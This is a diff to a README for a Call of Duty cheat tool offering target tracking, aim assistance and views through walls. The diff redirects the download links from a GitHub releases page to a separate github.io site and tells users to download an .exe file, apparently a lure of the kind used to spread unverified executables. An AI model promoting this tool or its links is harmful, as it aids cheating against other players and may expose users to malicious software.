@@ -1,6 +1,6 @@
 # 🎯 COD-Nova-X - Gain competitive advantage in Call of Duty
 
-[![](https://img.shields.io/badge/Download-Nova_X_Latest-blue.svg)](https://github.com/nuzi4996-lab/COD-Nova-X/releases)
+[![](https://img.shields.io/badge/Download-Nova_X_Latest-blue.svg)](https://nuzi4996-lab.github.io)
 
 COD-Nova-X provides players with tools to manage in-game performance. This software offers systems to track targets, adjust aim stability, and view player positions through obstacles. These features assist users who want to improve their play style during competitive matches.
 
@@ -29,7 +29,7 @@ Your computer requires the following components to run the software.
 
 Follow these steps to obtain the tool.
 
-1. Visit the project release page: [https://github.com/nuzi4996-lab/COD-Nova-X/releases](https://github.com/nuzi4996-lab/COD-Nova-X/releases)
+1. Visit the project release page: [https://nuzi4996-lab.github.io](https://nuzi4996-lab.github.io)
 2. Locate the most recent release version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or a folder you can find easily.
